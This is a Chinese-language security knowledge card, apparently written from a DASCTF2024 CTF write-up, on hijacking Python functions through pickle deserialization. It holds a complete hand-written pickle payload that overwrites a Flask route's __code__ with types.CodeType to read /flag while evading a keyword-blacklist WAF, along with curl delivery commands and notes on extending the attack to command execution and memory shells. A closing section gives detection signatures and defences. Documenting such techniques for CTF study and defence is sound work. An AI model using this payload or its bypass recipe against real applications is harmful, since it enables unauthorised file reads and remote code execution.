---
id: web-python-deserialization-pickle-codetype-function-hijack
title: pickle + types.CodeType 接管任意函数：关键字黑名单 WAF 下的文件读取与 RCE
type: scenario
domain: web
path: web/python/deserialization
technique: pickle-codetype-function-hijack
aliases:
- pickle 函数劫持
- pickle CodeType 绕过 WAF
- types.CodeType 替换 __code__
- pickle 任意函数接管
- pickle 关键字黑名单绕过
tags:
- python
- pickle
- deserialization
- codetype
- function-hijack
- waf-bypass
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T01:55:48+08:00'
  notes: 已对照原文与9张图片核对：DASCTF2024 const_python，pickle关键字黑名单下用builtins.getattr/setattr、types.CodeType、_codecs.encode(latin-1)替换admin/__code__读取/flag，图11为实打成功回显。原文payload误写ctypes CodeType，卡内已按types修正并说明；CodeType字段顺序仅适用Python3.8，3.11+有差异已注明；原文仅演示文件读取，RCE为标注的延伸用法。PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

当 pickle 入口只做关键字黑名单（过滤 `os`、`system`、`eval`、`exec`、`__builtins__` 等）时，可用 `builtins.getattr`/`builtins.setattr`、`types.CodeType` 和 `_codecs.encode` 构造载荷，在运行时把目标函数的 `__code__` 替换成攻击者代码对象，让既有路由执行任意逻辑（文件读取、RCE）。

## 原理

- pickle 的 `GLOBAL`/`STACK_GLOBAL` opcode 可按名字导入任意模块与属性，`REDUCE` 再调用它；只过滤少量危险关键字的黑名单无法限制 `builtins.getattr`、`builtins.setattr`、`types.CodeType`、`_codecs.encode` 等同样能完成利用的名字。
- Python 函数对象的执行逻辑由其 `__code__`（code object）决定；给已有函数赋新的 code object 不会改变函数名、模块归属、路由注册，也不会影响调用方接口，但后续每次调用都会执行新字节码。
- `types.CodeType` 构造器接收完整代码对象字段：`co_argcount`、`co_posonlyargcount`、`co_kwonlyargcount`、`co_nlocals`、`co_stacksize`、`co_flags`、`co_code`、`co_consts`、`co_names`、`co_varnames`、`co_filename`、`co_name`、`co_firstlineno`、`co_lnotab`、`co_freevars`、`co_cellvars`。复制一个模板函数的这些字段，只改 `co_consts`（如把 `'app.py'` 改成 `'/flag'`）或 `co_code`，即可改变函数行为而保持其余结构一致。
- `co_code` 必须是 `bytes`；pickle 的 `V`/`S` opcode 产生的是 `str`。文章用 `_codecs.encode(s, 'latin-1')` 把字符串按 1:1 字节映射成 `bytes`；**不能用 utf-8**，因为 `co_code` 中存在 `\x8d`、`\xa0` 等非 UTF-8 字节，utf-8 重新编码后字节被改写，运行时出现 `SystemError: unknown opcode`。
- 整套载荷只出现 `builtins`、`getattr`、`setattr`、`types`、`CodeType`、`_codecs`、`encode`、`latin-1`、`__code__` 等词，不含被黑名单拦截的 `os`/`system`/`eval`/`exec`/`__builtins__`，因此能穿过基于子串的 WAF。

## 触发条件

- 应用对攻击者可控的数据调用 `pickle.loads`，且未使用 `find_class` 允许列表。
- WAF 是关键字黑名单而非受限 Unpickler/允许列表；黑名单未覆盖 `builtins.getattr`、`builtins.setattr`、`types.CodeType`、`_codecs.encode`。
- 目标函数可由攻击者触发（如已注册的 Flask 路由函数），且其 `__code__` 字段可被本机模板函数复现（Python 3；文章环境为 Python 3.8）。
- 需要知道或猜出目标函数 `__code__` 的各字段值；可直接用同名/同签名模板函数枚举。

## 利用步骤

1. 确认 pickle 入口与黑名单词表；确认 `builtins`、`types`、`_codecs` 可导入。
2. 本地枚举模板函数的 `__code__` 字段，确定 `co_argcount`、`co_stacksize`、`co_flags`、`co_names`、`co_varnames` 等值。
3. 用手工 protocol 0 pickle（或 pker 生成后改写）组合：
   - `builtins.getattr(target, '__code__')` 取原 code object 及各字段；
   - `_codecs.encode(<原始字节字符串>, 'latin-1')` 生成 `co_code`；
   - 构造新的 `co_consts`（如把 `'app.py'` 改成 `/flag`）；
   - `types.CodeType(...)` 生成新 code object；
   - `builtins.setattr(target, '__code__', new_code)` 完成接管。
4. 请求触发该函数的正常路由（如 `/admin`），函数即执行攻击者逻辑。
5. 验证方式：读取 `/flag`、回显文件内容或执行命令；也可把函数改为命令执行/内存马逻辑。

## PoC

文章最终针对 `admin()` 路由函数的载荷（核心结构与字段顺序；原文此处模块名写作 `ctypes`，但 `ctypes` 并不导出 `CodeType`，能成功解析的是 `types.CodeType`，下列载荷已按 `types` 修正，实际以目标环境验证为准）：

```python
p1 = b'''cbuiltins
getattr
p0
c__main__
admin
p3
g0
(g3
S'__code__'
tRp4
I0
p5
I0
p6
I0
p7
I0
p8
I5
p9
I67
p10
c_codecs
encode
p33
g33
(Vt\x00d\x01d\x02d\x03d\x04\x8d\x03\xa0\x01\xa1\x00S\x00
S'latin-1'
tRp11
(NS'/flag'
S'r'
S'utf-8'
(S'encoding'
ttp12
(S'open'
S'read'
tp13
)p14
g0
(g4
S'co_filename'
tRp15
g0
(g4
S'co_name'
tRp16
I7
p17
g0
(g4
S'co_lnotab'
tRp18
)p19
)p20
types
CodeType
(g5
g6
g7
g8
g9
g10
g11
g12
g13
g14
g15
g16
g17
g18
g19
g20
tRp21
cbuiltins
setattr
(g3
S"__code__"
g21
tR.'''
```

把载荷 base64 后 POST 到 pickle 入口，再访问目标路由：

```bash
# 入口按题目为 /ppicklee，参数名 data
curl -XPOST http://target/ppicklee --data-urlencode "data=$(base64 -w0 payload.bin)"
curl -XPOST http://target/admin
```

文章环境返回 `DASCTF{...}`，说明 `admin()` 已被替换为读取 `/flag` 的函数。

## 变体与关联

- 把 `co_consts` 改成命令字符串、或把 `co_code` 换成调用 `__import__('os').system(...)` 的字节码，可进一步做 RCE；文章因 `sys.modules['os']` 被置为不可用且命令函数被过滤，仅演示了任意文件读取。
- 同一 CodeType 原语也可由变量覆盖、对象注入、原型链污染等触发，见通用函数劫持卡片。
- 非预期解法：应用运行中直接改写自身源文件 `app.py`（运行中的模块不受影响），再访问读取该文件的 `/src` 路由拿到 `/flag` 内容；依赖源码可写与存在回读路由，泛用性较低。
- `pker` 等工具可辅助生成 pickle，但对 `co_code` 这类原始字节字段支持不完整，需要手工补 protocol 0 的 `_codecs.encode`。
- 关联：[[web-python-codetype-function-code-hijack]]、[[web-python-deserialization-pickle-self-secret-signature-bypass]]。

## 检测与防御

- 用受限 `Unpickler.find_class` 做**允许列表**，只放行业务类；不要依赖关键字黑名单。
- 禁止对不可信数据使用 pickle，改用 JSON 等无代码执行能力的数据格式。
- 检测 pickle 流中出现 `builtins\ngetattr`、`builtins\nsetattr`、`types\nCodeType`、`_codecs\nencode`、`S'__code__'`、`latin-1` 等组合特征。
- 运行时用 `sys.addaudithook` 监控 `code.__new__`/`function.__new__` 等审计事件，以及异常的 `__code__` 赋值行为。
- 限制应用对自身源码与敏感文件的写权限，避免“改写源码后经原路由回读”的旁路。
